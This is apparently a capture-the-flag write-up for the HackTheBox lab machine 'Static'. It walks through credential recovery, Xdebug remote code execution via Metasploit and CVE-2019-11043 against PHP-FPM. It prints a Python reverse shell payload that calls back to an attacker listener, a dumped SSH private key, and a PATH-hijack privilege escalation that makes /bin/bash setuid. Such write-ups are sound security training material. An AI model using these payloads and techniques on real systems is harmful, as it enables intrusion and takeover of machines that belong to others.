# Static - HackTheBox - Writeup
Linux, 30 Base Points, Medium

## Machine

![‏‏Static.JPG](images/Static.JPG)
 
## TL;DR

To solve this machine, we begin by enumerating open services using ```namp``` – finding ports ```22```, ```2222``` and ```8080```.

***User***: On ```robots.txt``` file we found two URL's [/vpn] and [ftp_uploads], Download ```db.sql.gz``` file from the FTP, Fixed the corrupted file using ```fixgz```, On the fixed file we found the hash of the admin credentials to [/vpn] portal, Create OTP and log in as admin to the [/vpn] portal, From the VPN portal we download the ```web.ovpn``` file, Using that, We can access to the [web] website, Found file ```info.php``` which lead us to PHPInfo page, We found there ```Xdebug``` PHP extension which lead us to RCE, Using that we get a user ```www-data``` shell.

***Root***: 

![pwn.JPG](images/pwn.JPG)


## Static Solution

### User

Let's start with ```nmap``` scanning:

```console
┌─[evyatar@parrot]─[/hackthebox/Static]
└──╼ $ nmap -sV -sC -oA nmap/Static 10.10.10.246
Starting Nmap 7.80 ( https://nmap.org ) at 2021-10-30 22:11 IDT
Unable to split netmask from target expression: "nmap/Static"
Nmap scan report for 10.10.10.246
Host is up (0.19s latency).
Not shown: 997 filtered ports
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 16:bb:a0:a1:20:b7:82:4d:d2:9f:35:52:f4:2e:6c:90 (RSA)
|   256 ca:ad:63:8f:30:ee:66:b1:37:9d:c5:eb:4d:44:d9:2b (ECDSA)
|_  256 2d:43:bc:4e:b3:33:c9:82:4e:de:b6:5e:10:ca:a7:c5 (ED25519)
2222/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 a9:a4:5c:e3:a9:05:54:b1:1c:ae:1b:b7:61:ac:76:d6 (RSA)
|   256 c9:58:53:93:b3:90:9e:a0:08:aa:48:be:5e:c4:0a:94 (ECDSA)
|_  256 c7:07:2b:07:43:4f:ab:c8:da:57:7f:ea:b5:50:21:bd (ED25519)
8080/tcp open  http    Apache httpd 2.4.38 ((Debian))
| http-robots.txt: 2 disallowed entries 
|_/vpn/ /.ftp_uploads/
|_http-server-header: Apache/2.4.38 (Debian)
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```

By observing port ```8080``` we get a blank page.

By browsing to [http://10.10.10.246:8080/robots.txt](http://10.10.10.246:8080/robots.txt) we get:

![robots.JPG](images/robots.JPG)

Where [http://10.10.10.246:8080/vpn/login.php](http://10.10.10.246:8080/vpn/login.php) web page contains:

![vpn.JPG](images/vpn.JPG)

And [http://10.10.10.246:8080/.ftp_uploads/](http://10.10.10.246:8080/.ftp_uploads/) web page contains:

![ftpupload.JPG](images/ftpupload.JPG)

Let's download those files.

```warning.txt``` file contains the following text:
>Binary files are being corrupted during transfer!!! Check if are recoverable.

And when we are trying to ```gunzip``` the ```db.sql.gz``` file we get:
```console
┌─[evyatar@parrot]─[/hackthebox/Static]
└──╼ $gunzip db.sql.gz 

gzip: db.sql.gz: invalid compressed data--crc error

gzip: db.sql.gz: invalid compressed data--length error

```

Like the message on ```warning.txt``` says.

Let's try to fix the ```gz``` file using [fixgz](https://github.com/yonjar/fixgz).

First, Let's compile ```fixgz``` using ```gcc```:
```console
┌─[evyatar@parrot]─[/hackthebox/Static/fixgz]
└──╼ $ gcc fixgz.cpp -o fixgz
```

And then. Let's run it with the corrupted file as input:
```console
┌─[evyatar@parrot]─[/hackthebox/Static/fixgz]
└──╼ $ ./fixgz ../db.sql.gz fixed.gz
ls
┌─[evyatar@parrot]─[/hackthebox/Static/fixgz]
└──╼ $ fixed.gz  fixgz  fixgz.cpp  fixgz.exe  README.md
```

```fixgz``` created a new fixed file called ```fixed.gz```, Let's ```gunzip``` the fixed file:
```console
┌─[evyatar@parrot]─[/hackthebox/Static/fixgz]
└──╼ $ gunzip fixed.gz
┌─[evyatar@parrot]─[/hackthebox/Static/fixgz]
└──╼ $ cat fixed 
CREATE DATABASE static;
USE static;
CREATE TABLE users ( id smallint unsigned not null auto_increment, username varchar(20) not null, password varchar(40) not null, totp varchar(16) not null, primary key (id) ); 
INSERT INTO users ( id, username, password, totp ) VALUES ( null, 'admin', 'd033e22ae348aeb5660fc2140aec35850c4da997', 'orxxi4c7orxwwzlo' );

```

By cracking the hash ```d033e22ae348aeb5660fc2140aec35850c4da997``` using ```john``` we get ```admin```.

So the credentials are ```admin:admin```.

Next, We need to create ```OTP``` for ```OTP``` password ```orxxi4c7orxwwzlo```, To do so we can use [Authenticator](https://addons.mozilla.org/en-US/firefox/addon/auth-helper/) extension.

First, Let's log in to the portal:

![login.JPG](images/login.JPG)

Now, We need to generate the ```OTP``` password:

![otp.JPG](images/otp.JPG)

Let's generate it:

![authenticator.JPG](images/authenticator.JPG)

NOTE: If your timezone Isn't syncing with the server time - run the following command to get ```OTP```:
```console
┌─[evyatar@parrot]─[/hackthebox/Static]
└──╼ $ sudo date -s "`curl -ski http://10.10.10.246:8080/ | sed -n '/^Date/s/^Date: //gp' | tee /dev/tty`"; date -u; oathtool -b --totp 'orxxi4c7orxwwzlo'
Sun, 31 Oct 2021 21:22:06 GMT
Sun 31 Oct 2021 11:22:06 PM IST
Sun 31 Oct 2021 09:22:06 PM UTC
231803

```

And now we get into the following portal:

![panel.JPG](images/panel.JPG)

Let's download all VPN's as follows:

![vpndownload.JPG](images/vpndownload.JPG)

Now, When we are trying to use it we get the following error:
```console
┌─[evyatar@parrot]─[/hackthebox/Static]
└──╼ $ sudo openvpn web.ovpn 
[sudo] password for user: 
Sun Oct 31 23:47:57 2021 OpenVPN 2.4.9 x86_64-pc-linux-gnu [SSL (OpenSSL)] [LZO] [LZ4] [EPOLL] [PKCS11] [MH/PKTINFO] [AEAD] built on Apr 21 2020
Sun Oct 31 23:47:57 2021 library versions: OpenSSL 1.1.1k  25 Mar 2021, LZO 2.10
Sun Oct 31 23:47:57 2021 Outgoing Control Channel Authentication: Using 160 bit message hash 'SHA1' for HMAC authentication
Sun Oct 31 23:47:57 2021 Incoming Control Channel Authentication: Using 160 bit message hash 'SHA1' for HMAC authentication
Sun Oct 31 23:47:57 2021 RESOLVE: Cannot resolve host address: vpn.static.htb:1194 (Name or service not known)
Sun Oct 31 23:47:57 2021 RESOLVE: Cannot resolve host address: vpn.static.htb:1194 (Name or service not known)
Sun Oct 31 23:47:57 2021 Could not determine IPv4/IPv6 protocol
Sun Oct 31 23:47:57 2021 NOTE: UID/GID downgrade will be delayed because of --client, --pull, or --up-delay
Sun Oct 31 23:47:57 2021 SIGUSR1[soft,init_instance] received, process restarting
Sun Oct 31 23:47:57 2021 Restart pause, 5 second(s)

```

As we can see - It Isn't found the host ```vpn.static.htb```, Let's add it to ```/etc/hosts``` and try again:
```console
┌─[evyatar@parrot]─[/hackthebox/Static]
└──╼ $ sudo openvpn web.ovpn 
Sun Oct 31 23:51:16 2021 OpenVPN 2.4.9 x86_64-pc-linux-gnu [SSL (OpenSSL)] [LZO] [LZ4] [EPOLL] [PKCS11] [MH/PKTINFO] [AEAD] built on Apr 21 2020
...
Sun Oct 31 23:51:18 2021 Initialization Sequence Completed

```

We have a new interface:
```console
┌─[evyatar@parrot]─[/hackthebox/Static]
└──╼ $ ifconfig tun9
tun9: flags=4305<UP,POINTOPOINT,RUNNING,NOARP,MULTICAST>  mtu 1500
        inet 172.30.0.9  netmask 255.255.0.0  destination 172.30.0.9
        inet6 fe80::2216:6c36:2570:970c  prefixlen 64  scopeid 0x20<link>
        unspec 00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00  txqueuelen 100  (UNSPEC)
        RX packets 1  bytes 40 (40.0 B)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 7  bytes 348 (348.0 B)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 
```
When we are trying to access to ```web``` on [http://172.20.0.10](http://172.20.0.10) It's still not working.

We have the IP ```172.30.0.9``` and the IP of the web page we want to access is ```172.20.0.10```

We need to add the route for access the web page in ```tun9``` interface as follows:
```console
┌─[evyatar@parrot]─[/hackthebox/Static]
└──╼ $ ip route add 172.20.0.0/24 dev tun9
```

And now we can access to [http://172.20.0.10](http://172.20.0.10):

![webvpn.JPG](images/webvpn.JPG)

By browsing to ```phpinfo.php``` we can see the following:

![xdebug.JPG](images/xdebug.JPG)

We can see the ```Xdebug``` - where ```Xdebug``` is a PHP extension that allows debugging PHP pages, remotely by using ```DGBp protocol```. 

Code execution is possible via injections that exist in ```eval``` or ```property_set``` xdebug commands.

We can use the following [metasploit xdebug_unauth_exec](https://www.rapid7.com/db/modules/exploit/unix/http/xdebug_unauth_exec/) to get RCE:
```console
msf6 exploit(unix/http/xdebug_unauth_exec) > options

Module options (exploit/unix/http/xdebug_unauth_exec):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   PATH     /vpn/login.php   yes       Path to target webapp
   Proxies                   no        A proxy chain of format type:host:port[,type:host:po
                                       rt][...]
   RHOSTS   172.20.0.10      yes       The target host(s), see https://github.com/rapid7/me
                                       tasploit-framework/wiki/Using-Metasploit
   RPORT    80               yes       The target port (TCP)
   SRVHOST  0.0.0.0          yes       Callback host for accepting connections
   SRVPORT  9000             yes       Port to listen for the debugger
   SSL      false            no        Negotiate SSL/TLS for outgoing connections
   VHOST                     no        HTTP server virtual host


Payload options (php/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  tun9             yes       The listen address (an interface may be specified)
   LPORT  9001             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic
   
msf6 exploit(unix/http/xdebug_unauth_exec) > run
[*] Started reverse TCP handler on 172.30.0.9:9001
[*] 172.20.0.10:80 - Waiting for client response.
[*] 172.20.0.10:80 - Receiving response
[*] 172.20.0.10:80 - Shell might take upto a minute to respond.Please be patient.
[*] 172.20.0.10:80 - Sending payload of size 2026 bytes
[*] Sending stage (39282 bytes) to 172.30.0.1
[*] Meterpreter session 2 opened (172.30.0.9:9001 -> 172.30.0.1:53424) at 2021-06-21 00:56:43 -0500

meterpreter > shell
Process 381 created.
Channel 0 created.
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

And now Let's get the SSH private key of ```www-data```:
```console
cat /home/www-data/.ssh/id_rsa
-----BEGIN RSA PRIVATE KEY-----
MIIEowIBAAKCAQEA0pNa5qwGZ+DKsS60GPhNfCqZti7z1xPzxOTXwtwO9uYzZpq/
nrhzgJq0nQNVRUbaiZ+H6gR1OreDyjr9YorV2kJqccscBPZ59RAhttaQsBqHkGjJ
QEHYKteL1D+hJ80NDd7fJTtQgzT4yBDwrVKwIUSETMfWgzJ5z24LN5s/rcQYgl3i
VKmls3lsod8ilakdDoYEYt12L4ST/exEoVl0AyD9y8m651q40k1Gz4WzPnaHAlnj
mL6CANfiNAJoc8WnqZN5ruSrWhmivmDbKLlDCO5bCCzi2zMHJKqQkcBxdWk60Qhi
17UJMV3mKVQRprvpeTR2jCMykH81n2KU46doSQIDAQABAoIBAADCHxWtkOhW2uQA
cw2T91N3I86QJLiljb8rw8sj17nz4kOAUyhTKbdQ102pcWkqdCcCuA6TrYhkmMjl
pXvxXAvJKXD3dkZeTNohEL4Dz8mSjuJqPi9JDWo6FHrTL9Vg26ctIkiUChou2qZ9
ySAWqCO2h3NvVMpsKBwjHU858+TASlo4j03FJOdmROmUelcqmRimWxgneHBAHEZj
GqDuPjmPmw7pbThqlETyosrbaB3rROzUp9CKAHzYB1BvOTImDsb6qQ+GdKwewAQf
j60myPuxl4qgY8O2yqLFUH3/ovtPTKqHJSUFBO23wzS1qPLupzu1GVXwlsdlhRWA
Amvx+AECgYEA6OOd9dgqXR/vBaxDngWB6ToVysWDjO+QsjO4OpFo7AvGhMRR+WpK
qbZyJG1iQB0nlAHgYHEFj4It9iI6NCdTkKyg2UzZJMKJgErfgI0Svkh/Kdls23Ny
gxpacxW3d2RlyAv4m2hG4n82+DsoPcN+6KxqGRQxWywXtsBsYkRb+wkCgYEA53jg
+1CfGEH/N2TptK2CCUGB28X1eL0wDs83RsU7Nbz2ASVQj8K0MlVzR9CRCY5y6jcq
te1YYDiuFvT+17ENSe5fDtNiF1LEDfp45K6s4YU79DMp6Ot84c2fBDIh8ogH0D7C
CFdjXCI3SIlvc8miyivjRHoyJYJz/cO94DsTE0ECgYA1HlWVEWz4OKRoAtaZYGA1
Ng5qZYqPxsSWIL3QfgIUdMse1ThtTxUgiICYVmqmfP/d/l+TH7RI+0RIc54a7y1c
PkOhzKlqfQSnwmwgAg1YYWi/vtvZYgeoZ4Zh4X4rOTcN3c0ihTJFzwZWsAeJruFv
aIP6nGR1iyUNhe4yq6zfIQKBgANYQNAA2zurgHeZcrMUqsNdefXmB2UGPtKH9gGE
yhU9tMRReLeLFbWAfJj2D5J2x3xQ7cIROuyxBPr58VDGky2VTzRUo584p/KXwvVy
/LaJiVM/BgUCmhxdL0YNP2ZUxuAgeAdM0/e52time8DNkhefyLntlhnqp6hsEqtR
zzXBAoGBANB6Wdk/X3riJ50Bia9Ai7/rdXUpAa2B4pXARnP1/tw7krfPM/SCMABe
sjZU9eeOecWbg+B6RWQTNcxo/cRjMpxd5hRaANYhcFXGuxcg1N3nszhWDpHIpGr+
s5Mwc3oopgv6gMmetHMr0mcGz6OR9KsH8FvW1y+DYY3tUdgx0gau
-----END RSA PRIVATE KEY-----

```

Let's use it:
```console
┌─[evyatar@parrot]─[/hackthebox/Static]
└──╼ $ ssh -i id_rsawww www-data@172.20.0.10
load pubkey "id_rsawww": invalid format
Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.19.0-17-amd64 x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

This system has been minimized by removing packages and content that are
not required on a system that users do not log into.

To restore this content, you can run the 'unminimize' command.
Last login: Mon Jun 14 08:00:30 2021 from 10.10.14.4
www-data@web:~$ cd ..
www-data@web:/home$ pwd
/home
www-data@web:/home$ cat user.txt 
8f43b1217463d97de0656b2320f8a17c

```

And we get the user flag ```8f43b1217463d97de0656b2320f8a17c```.

We can use this private key also on with machine IP:
```console
┌─[evyatar@parrot]─[/hackthebox/Static]
└──╼ $  ssh -i id_rsawww www-data@10.10.10.246 -p 2222
load pubkey "id_rsawww": invalid format
Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.19.0-17-amd64 x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

This system has been minimized by removing packages and content that are
not required on a system that users do not log into.

To restore this content, you can run the 'unminimize' command.
Last login: Tue Nov  2 20:09:29 2021 from 172.30.0.9
www-data@web:~$
```

### Root

As we can see on the portal we have another interface with IP ```192.168.254.3```:

![panel.JPG](images/panel.JPG)

Let's make port forwarding to access this interface:
```console
┌─[evyatar@parrot]─[/hackthebox/Static]
└──╼ $ ssh -N -L 8888:192.168.254.3:80 -i id_rsawww www-data@10.10.10.246 -p 2222
```

Now, When we access to [http://localhost:8888](http://localhost:8888) we can see the following web page:

![port8888.JPG](images/port8888.JPG)

If we look at the HTTP response to this web page we can see:
```HTTP
HTTP/1.1 200 OK
Server: nginx/1.14.0 (Ubuntu)
Date: Tue, 02 Nov 2021 20:37:23 GMT
Content-Type: text/html; charset=UTF-8
Transfer-Encoding: chunked
Connection: keep-alive
X-Powered-By: PHP-FPM/7.1
Content-Encoding: gzip
```

As we can see It's powered by ```PHP-FPM/7.1``` , We know about ```CVE-2019-11043``` related to ```PHP-FPM```, Let's exploit it using [https://github.com/theMiddleBlue/CVE-2019-11043](https://github.com/theMiddleBlue/CVE-2019-11043):

```console
┌─[evyatar@parrot]─[/hackthebox/Static]
└──╼ $ git clone https://github.com/theMiddleBlue/CVE-2019-11043.git
┌─[evyatar@parrot]─[/hackthebox/Static/CVE-2019-11043]
└──╼ $ python3 exploit.py --url http://localhost:8888/index.php
[*] QSL candidate: 1754, 1759, 1764

[*] Target seems vulnerable (QSL:1754/HVL:219): PHPSESSID=fcb5057679c9e6fac09fe95876979e63; path=/
[*] RCE successfully exploited!

    You should be able to run commands using:
    curl http://localhost:8888/index.php?a=bin/ls+/

```

Now we can get RCE, We want to get a reverse shell, to do so we need to listen from the target machine and not from our host.

Let's upload to the target machine the ```exploit.py``` script and [nc](https://github.com/H74N/netcat-binaries/blob/master/nc) using ```scp```:
```console
┌─[evyatar@parrot]─[/hackthebox/Static]
└──╼ $ scp -P 2222 -i ../id_rsawww nc www-data@10.10.10.246:/home/www-data/exp/nc
nc                                                          100%  762KB  51.0KB/s   00:14
┌─[evyatar@parrot]─[/hackthebox/Static]
└──╼ $ scp -P 2222 -i ../id_rsawww exploit.py www-data@10.10.10.246:/home/www-data/exp/exploit.py
exploit.py                                                  100% 4280    13.5KB/s   00:00
```

And let's upload also the following script ```rev.py```:
```console
import requests
 
rev = '/usr/bin/python3.6 -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.254.2",9001));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")\''
 
req = requests.get("http://192.168.254.3/index.php?a="+rev)
print(req.text)

```

Now, Let's open another SSH and listen to port ```9001```:
```console
ww-data@web:~/exp$ ./nc -lvp 9001
listening on [any] 9001 ...

```

And of the first SSH let's run the python script ```rev.py```:
```console
python3 rev.py 
<html>
<head><title>504 Gateway Time-out</title></head>
<body bgcolor="white">
<center><h1>504 Gateway Time-out</h1></center>
<hr><center>nginx/1.14.0 (Ubuntu)</center>
</body>
</html>

```

And we get a reverse shell on the second SSH:
```console
www-data@web:~/exp$ nc -lvp 9001
-bash: nc: command not found
www-data@web:~/exp$ ./nc -lvp 9001
listening on [any] 9001 ...
192.168.254.3: inverse host lookup failed: ���fy
connect to [192.168.254.2] from (UNKNOWN) [192.168.254.3] 39230
www-data@pki:~/html$
```

As we saw before, on the web page the file ```batch mode: /usr/bin/ersatool create|print|revoke CN ```, Let's observe this file (This binary running as ```root```):
```console
www-data@pki:~/html$ file /usr/bin/ersatool
file /usr/bin/ersatool
/usr/bin/ersatool: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/l, for GNU/Linux 3.2.0, BuildID[sha1]=961368a18afcdeccddd1f423353ff104bc09e6ae, not stripped
```

By enumerating we found the source code of this binary:
```console
www-data@pki:/usr/bin$ find / -name ersatool.* 2>/dev/null
/usr/src/ersatool.c 
```

Let's observe this code:
```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/types.h>
#include <unistd.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <libgen.h>
#include <sys/wait.h>
#include <ctype.h>

//easyrsa configuration
char ERSA_DIR[]="/opt/easyrsa";
char TA_KEY[]="/opt/easyrsa/clients/ta.key";
char OUTPUT_DIR[]="/opt/easyrsa/clients";
char BASE_CONFIG[]="/opt/easyrsa/clients/base.conf";
char EXT[]=".ovpn";

//void printCN(char*,int);
void filePrint(char*);
void revokeCN(char*,int);
void createCN(char*,int);
void integrateCN(char*);
void getHelp(char*,int);
void cleanStr(char*);

//deprecated function - prints the CN ovpn config file
//conf file can be printed with inegrateCN(); <- create
void printCN(char *cn, int i){
	char fn[100];
	char buffer[100];

	if(i==1){
		printf("print->CN=");
		fflush(stdout);
		memset(buffer,0,sizeof(buffer));
		read(0,buffer,sizeof(buffer));
	} 
	else { 
		memset(buffer,0,sizeof(buffer));
		strncat(buffer,cn,sizeof(buffer)); 
	}

	if(!strncmp("\n",buffer,1)) { return; }

	do{
		strncpy(fn, OUTPUT_DIR,sizeof(fn));
		strncat(fn, "/",sizeof(fn)-strlen(fn));
		strncat(fn, strtok(basename(buffer),"\n"),sizeof(fn)-strlen(fn));
		strncat(fn, EXT, sizeof(fn)-strlen(fn));
		printf(buffer); //checking buffer content
		filePrint(fn);
		if(i==1){

			printf("\nprint->CN=");
			fflush(stdout);
			memset(buffer,0,sizeof(buffer));
			read(0,buffer,sizeof(buffer));
		}
	} while (strncmp("\n",buffer,1) && i==1);
}

void filePrint(char *filename){
	int bfsiz=1;
	char buffer[bfsiz];
	int fd;
	ssize_t fr;
	memset(buffer,0,bfsiz);
	setuid(0); //escalating privileges to read root owned files
	if((fd=open(filename,O_RDONLY))<0){
		printf("[!] ERR reading %s!\n",filename);
	}
	while(fr=read(fd,buffer,bfsiz)>0){
		printf("%s",buffer);
		memset(buffer,0,bfsiz);
	}
	close(fd);
	fflush(stdout);
}

void revokeCN(char *cn, int i){
	puts("[!] Not implemented");
	fflush(stdout);
}

//creates and prints new CN config file
void createCN(char *cn, int i){
	int devNull, sout, serr, pid, status, oid;
	char EASYRSA[50];
	char buffer[100];
	char CMD[100];
	char WD[50];
	
	memset(EASYRSA,0,sizeof(EASYRSA));
	strcat(EASYRSA,ERSA_DIR);
	strcat(EASYRSA,"/easyrsa");

	if(i==1){
		printf("create->CN=");
		fflush(stdout);
		memset(buffer,0,sizeof(buffer));
		read(0,buffer,sizeof(buffer));
	} 
	else { 
		memset(buffer,0,sizeof(buffer));
		strncat(buffer, cn, sizeof(buffer));
	}

	if(!strncmp("\n",buffer,1)) { return; }

	do{
		pid = vfork();
		if(pid==0){
			char *a[] = {EASYRSA,"build-client-full",strtok(basename(buffer),"\n"),"nopass","batch"};
			//forge the command string
			cleanStr(a[2]);
			sprintf(CMD,"%s %s %.20s %s %s",a[0],a[1],a[2],a[3],a[4]);
			sout=dup(STDOUT_FILENO);
			serr=dup(STDERR_FILENO);
			devNull=open("/dev/null",O_WRONLY);
			dup2(devNull,STDOUT_FILENO);
			dup2(devNull,STDERR_FILENO);
			setuid(0); //escalating privilges to generate required files
			chdir(ERSA_DIR);
			system(CMD);
			exit(0);
		} 
		dup2(sout,STDOUT_FILENO);
		dup2(serr,STDERR_FILENO);
		close(devNull);
		usleep(500000);
		integrateCN(buffer);

		if(i==1){
			printf("create->CN=");
			fflush(stdout);
			memset(buffer,0,sizeof(buffer));
			read(0,buffer,sizeof(buffer));
		}
	} while (strncmp("\n",buffer,1) && i==1);
}

//print valid ovpnfile for provided cn
void integrateCN(char *cn){
	char PKI_DIR[50];
	char KEY_DIR[50];
	char CRT_DIR[50];
	char CA_CERT[50];
	char CN_CERT[50];
	char CN_KEY[50];

	memset(PKI_DIR,0,sizeof(PKI_DIR));
	memset(KEY_DIR,0,sizeof(KEY_DIR));
	memset(CRT_DIR,0,sizeof(CRT_DIR));
	memset(CA_CERT,0,sizeof(CA_CERT));
	memset(CN_CERT,0,sizeof(CN_CERT));
	memset(CN_KEY,0,sizeof(CN_KEY));

	strcat(PKI_DIR,ERSA_DIR);
	strcat(PKI_DIR,"/pki");
	strcat(KEY_DIR,PKI_DIR);
	strcat(KEY_DIR,"/private");
	strcat(CRT_DIR,PKI_DIR);
	strcat(CRT_DIR,"/issued");
	strcat(CA_CERT,PKI_DIR);
	strcat(CA_CERT,"/ca.crt");
	strcat(CN_CERT,CRT_DIR);
	strcat(CN_CERT,"/");
	strcat(CN_CERT,basename(cn));
	strcat(CN_CERT,".crt");
	strcat(CN_KEY,KEY_DIR);
	strcat(CN_KEY,"/");
	strcat(CN_KEY,basename(cn));
	strcat(CN_KEY,".key");

	filePrint(BASE_CONFIG);

	printf("<ca>\n");
	filePrint(CA_CERT);
	printf("</ca>\n");
	
	printf("<cert>\n");
	filePrint(CN_CERT);
	printf("</cert>\n");

	printf("<key>\n");
	filePrint(CN_KEY);
	printf("</key>\n");

	printf("key-direction 1\n<tls-auth>\n");
	filePrint(TA_KEY);
	printf("</tls-auth>\n");
	fflush(stdout);
}

void getHelp(char *prog, int i){
	if(i==1) {
		printf("create|print|revoke|exit\n");
		fflush(stdout);
	}
	else{
		printf("batch mode: %s create|print|revoke CN\n",prog);
		fflush(stdout);
		exit(255);
	}
}

//clean non alphanum chars from string to secure
void cleanStr(char *str)
{
    unsigned long i = 0;
    unsigned long j = 0;
    char c;

    while ((c = str[i++]) != '\0')
    {
        if (isalnum(c))
        {
            str[j++] = c;
        }
    }
    str[j] = '\0';
}

int main(int argc, char **argv){
	int interactive=0;
	char opt[8];
	char *cn;

	if(argc!=3 && argc!=1){ 
		getHelp(argv[0],interactive);
	} 
	else if(argc==1){
		interactive=1;
		printf("# ");
		fflush(stdout);
		memset(opt,0,sizeof(opt));
		read(0,opt,sizeof(opt));
		cn=NULL;
	}
	else {
		strncpy(opt,argv[1],sizeof(opt));
		cn=argv[2];
	}

	do 	{		
		if(!strncmp("revoke",opt,6)){
			revokeCN(cn,interactive);
		} 
		else if (!strncmp("print",opt,5)){
			printCN(cn,interactive);
		}
		else if (!strncmp("create",opt,6)){
			createCN(cn,interactive);
		}
		else if (!strncmp("exit",opt,4)){
			exit(0);
		}
		else{ 
			getHelp(argv[0], interactive);
		}

		if(interactive==1){
			memset(opt,0,sizeof(opt));
			printf("# ");
			fflush(stdout);
			memset(opt,0,sizeof(opt));
			read(0,opt,sizeof(opt));
		}
	} while(interactive==1);
}
```

We need to monitor the binary calls using [pspy64](https://github.com/DominicBreuker/pspy/releases/download/v1.2.0/pspy64s).

By running the ```pspy```  we found that ```openssl``` was called without giving the full path, Meaning we can change the ```PATH``` to point it to our ```openssl```:
```console
...
2021/06/25 02:46:03 CMD: UID=33   PID=1959   | /usr/bin/ersatool
2021/06/25 02:46:35 CMD: UID=0    PID=1961   | sh -c /opt/easyrsa/easyrsa build-client-full a nopass batch
2021/06/25 02:46:35 CMD: UID=0    PID=1960   | /usr/bin/ersatool
2021/06/25 02:46:35 CMD: UID=0    PID=1962   | /bin/sh /opt/easyrsa/easyrsa build-client-full a nopass batch
2021/06/25 02:46:35 CMD: UID=0    PID=1963   | sed -e s`ENV::EASYRSA`EASYRSA`g -e s`$dir`/opt/easyrsa/pki`g -e s`$EASYRSA_PKI`/opt/easyrsa/pki`g -e s`$EASYRSA_CERT_EXPIRE`36500`g -e s`$EASYRSA_CRL_DAYS`180`g -e s`$EASYRSA_DIGEST`sha256`g -e s`$EASYRSA_KEY_SIZE`2048`g -e s`$EASYRSA_DIGEST`sha256`g -e s`$EASYRSA_DN`cn_only`g -e s`$EASYRSA_REQ_COUNTRY`US`g -e s`$EASYRSA_REQ_PROVINCE`California`g -e s`$EASYRSA_REQ_CITY`San Francisco`g -e s`$EASYRSA_REQ_ORG`Copyleft Certificate Co`g -e s`$EASYRSA_REQ_OU`My Organizational Unit`g -e s`$EASYRSA_REQ_CN`ChangeMe`g -e s`$EASYRSA_REQ_EMAIL`me@example.net`g /opt/easyrsa/pki/openssl-easyrsa.cnf
2021/06/25 02:46:35 CMD: UID=0    PID=1964   | /bin/sh /opt/easyrsa/easyrsa build-client-full a nopass batch
2021/06/25 02:46:35 CMD: UID=0    PID=1965   | openssl version
...
```

So let's create our ```opensssl``` on ```/tmp/exp```:
```console
www-data@pki:/tmp/exp$ cat openssl
cat openssl
#!/bin/bash
chmod u+s /bin/bash
```

Now, Let's append this path to ```PATH```:
```console
www-data@pki:/tmp/pwn$ export PATH=/tmp/exp:$PATH
```

Next, Let's run ```ersatool``` to make a call our ```openssl``` as root:
```console
www-data@pki:/tmp/pwn$ ersatool
ersatool
# create
create
create->CN=a
a
client
dev tun9
proto udp
remote vpn.static.htb 1194
resolv-retry infinite
nobind
user nobody
group nogroup
persist-key
persist-tun
...
create->CN=

# exit
exit
```

Now, Let's look at ```/bin/bash``` permission:
```console
www-data@pki:/tmp/pwn$ ls -al /bin/bash
ls -al /bin/bash
-rwsr-xr-x 1 root root 1113504 Jun  6  2019 /bin/bash
```

Great, Now let's run ```/bin/bash -p``` to get the root flag:
```console
www-data@pki:/tmp/pwn$ /bin/bash -p
/bin/bash -p
bash-4.4# whoami
whoami
root
bash-4.4# cat /root/root.txt
cat /root/root.txt
18dfb4f7a9871458a34beb51f817294a
```

And we get the root flag ```18dfb4f7a9871458a34beb51f817294a```.

